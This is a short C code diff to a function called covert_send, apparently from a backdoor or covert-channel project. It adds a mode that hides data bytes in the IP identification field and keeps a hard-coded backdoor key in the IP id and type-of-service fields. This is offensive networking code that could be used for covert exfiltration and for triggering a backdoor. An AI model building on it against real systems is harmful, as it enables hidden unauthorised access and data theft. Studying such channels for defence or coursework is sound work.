@@ -18,7 +18,7 @@
 #include <stdlib.h>
 #include "covert_wrappers.h"
 
-void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data) {
+void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dport, unsigned char* data, int covert_channel) {
     int bytes_sent;
     int sending_socket;
     struct sockaddr_in sin;
@@ -38,10 +38,14 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
     packet.ip.tot_len = htons(40);
 
 
-    //key for backdoor
-    packet.ip.id = 'b';  //enter a single ASCII character into the field
-    packet.ip.tos = 'l';
-
+    if(covert_channel == 1) {
+        packet.ip.id = data[0];
+        packet.ip.tos = 0;
+    } else {
+        //key for backdoor
+        packet.ip.id = 'b';  //enter a single ASCII character into the field
+        packet.ip.tos = 'l';
+    }
 
     packet.ip.frag_off = 0;
     packet.ip.ttl = 64;
